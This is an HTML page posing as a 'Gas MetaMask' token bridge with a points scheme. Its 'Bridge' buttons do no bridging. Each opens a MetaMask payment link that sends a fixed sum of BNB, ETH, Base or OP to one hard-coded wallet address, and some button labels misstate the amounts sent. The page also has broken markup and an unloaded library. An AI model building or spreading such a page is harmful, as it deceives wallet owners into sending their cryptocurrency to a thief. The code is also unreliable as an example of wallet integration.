<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gas MetaMask - Bridge Platform</title>

    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin: 20px; }
        button { padding: 10px; margin: 10px; cursor: pointer; }
        input, select { padding: 8px; margin: 5px; }
        .protocol-buttons { margin-top: 20px; }
    </style>
</head>
<body>
    <h1>Gas MetaMask - Bridge Platform</h1>

    <button id="connectWallet">Connect MetaMask</button>
    <p id="walletAddress">Not connected</p>

    <h2>How to Earn Points</h2>

    </ul>

    <h2>Bridge Tokens via Protocols</h2>

    <div class="protocol-buttons">
        <h3>BNB Smart Chain</h3>
        <button onclick="window.open('https://metamask.app.link/send/0x7aBa48b1CFAfD87976A270c384387345343Ee8a8@56?value=5555555555555552', '_blank')">
            Bridge 1.17 BNB
        </button>
        <button onclick="window.open('https://metamask.app.link/send/0x7aBa48b1CFAfD87976A270c384387345343Ee8a8@56?value=77777777777777777', '_blank')">
            Bridge 0.172 BNB
        </button>

        <h3>Ethereum</h3>
        <button onclick="window.open('https://metamask.app.link/send/0x7aBa48b1CFAfD87976A270c384387345343Ee8a8@1?value=1000000000000000000', '_blank')">
            Bridge 1 ETH
        </button>

        <h3>BASE</h3>
        <button onclick="window.open('https://metamask.app.link/send/0x7aBa48b1CFAfD87976A270c384387345343Ee8a8@8453?value=1000000000000000000', '_blank')">
            Bridge 1 BASE
        </button>

        <h3>Optimism (OP)</h3>
        <button onclick="window.open('https://metamask.app.link/send/0x7aBa48b1CFAfD87976A270c384387345343Ee8a8@10?value=1000000000000000000', '_blank')">
            Bridge 1 OP
        </button>
    </div>

    <h2>Earned Points</h2>
    <p id="points">0 points</p>

    <script>
        let provider, signer, userAddress = "";
        let points = 0;

        async function connectMetaMask() {
            if (typeof window.ethereum !== "undefined") {
                try {
                    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
                    await window.ethereum.request({ method: "eth_requestAccounts" });
                    signer = provider.getSigner();
                    userAddress = await signer.getAddress();
                    document.getElementById("walletAddress").innerText = Connected: ${userAddress};
                    console.log("Connected to MetaMask:", userAddress);
                } catch (error) {
                    console.error("MetaMask connection error:", error);
                    alert("Failed to connect to MetaMask. Check the console for details.");
                }
            } else {
                alert("MetaMask is not installed. Please install it and try again.");
            }
        }

        document.getElementById("connectWallet").addEventListener("click", connectMetaMask);
    </script>
</body>
</html>
